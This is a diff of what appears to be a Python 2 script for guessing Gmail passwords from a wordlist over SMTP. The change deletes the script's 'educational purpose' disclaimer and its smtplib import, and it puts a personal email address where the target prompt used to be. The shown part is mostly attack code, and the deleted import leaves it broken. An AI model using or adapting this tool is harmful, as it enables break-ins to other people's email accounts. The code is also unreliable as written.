@@ -26,14 +26,12 @@ print"                ***  *  *  **  *  * ***   "
 print"                 **                 **    "
 print"                   *                *     "
 
-print" Disclaimer- This tool is only for educational purpose"
-import smtplib
 
 smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 
-user = raw_input("Enter the target's email address: ")
+user = raw_input("ashumasram2018@gmail.com: ")
 passwfile = raw_input("Enter the password file name: ")
 passwfile = open(passwfile, "r")
 
